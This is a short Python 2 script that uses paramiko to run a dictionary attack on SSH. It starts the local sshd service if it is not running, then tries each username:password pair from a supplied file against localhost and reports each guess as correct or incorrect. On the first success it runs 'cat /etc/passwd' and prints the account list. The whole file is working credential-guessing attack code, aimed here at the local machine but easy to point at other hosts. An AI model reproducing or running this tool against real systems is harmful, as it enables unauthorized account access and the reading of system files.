import paramiko
import socket
import os
import sys
	
stream = os.popen("ps -e | grep 'sshd'")

if stream.read()=='':
	
	os.popen("sudo service ssh start")


ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

fd = open(sys.argv[1], "r")

### Username and password in form "username:password" ###

for line in fd.readlines():

	user_pass = line.strip().split(':')

	try:
		ssh.connect('localhost', username=user_pass[0], password=user_pass[1])

	except paramiko.AuthenticationException:
		print '[*] Username %s and Password %s is Incorrect!' %(user_pass[0],user_pass[1])

	else:	
		print '[+] Username %s and Password %s is Correct!' %(user_pass[0],user_pass[1])

		stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
	
		for line in stdout.readlines():
 			print line.strip()
		break


ssh.close()
os.popen("sudo service ssh stop")
